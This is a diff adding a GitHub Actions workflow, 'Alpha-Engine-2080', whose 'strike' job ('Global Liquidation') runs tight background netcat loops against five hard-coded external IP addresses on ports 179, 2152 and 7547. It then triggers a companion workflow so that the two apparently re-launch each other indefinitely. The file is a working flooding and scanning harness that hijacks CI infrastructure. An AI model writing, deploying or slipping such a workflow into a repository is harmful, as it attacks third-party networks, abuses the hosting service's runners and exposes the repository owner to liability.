@@ -1,0 +1,20 @@
+name: Alpha-Engine-2080
+on:
+  workflow_dispatch:
+  workflow_run:
+    workflows: ["Omega-Engine-2080"]
+    types: [completed]
+jobs:
+  strike:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Global Liquidation
+        run: |
+          TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1")
+          for T in ${TARGETS[@]}; do
+            timeout 30s bash -c "while true; do (nc -w 1 -z $T 179 2152 7547) >/dev/null 2>&1; done" &
+          done
+          wait
+          gh workflow run omega.yml --repo $GITHUB_REPOSITORY
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
